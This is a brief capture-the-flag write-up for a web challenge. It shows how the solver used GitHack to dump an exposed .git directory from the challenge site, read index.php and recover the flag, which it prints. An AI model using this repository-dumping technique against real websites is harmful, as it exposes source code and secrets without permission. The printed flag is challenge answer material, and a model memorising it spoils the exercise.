# Gotcha

Author: 孫逸平

Date: 2024-06-07

Link: https://ctfd.fhh4ck3rs.taipei/challenges#Gotcha-3

## 題目說明

Can you get the flag?

> Author: Scott

> **Hint:**
>
> 各種偵查手段，你真的都用過了嗎？
> 
> 你非常確定嗎？
> 真的嗎？？？？

> **Hint:**
>
> 你有聽過 **版本控制** 嗎？

## Write-up

1. 根據提示猜測其為 git 版本控制檔洩漏之漏洞。
2. 利用 GitHack 找到 index.php 檔。
    ```shell
    python3 GitHack.py https://gotcha.fhh4ck3rs.taipei/.git
    cd gotcha.fhh4ck3rs.taipei
    ls
    cat index.php
    ```
3. 查看檔案即可找到 flag：`FhCTF{I_9iT_!7}`。
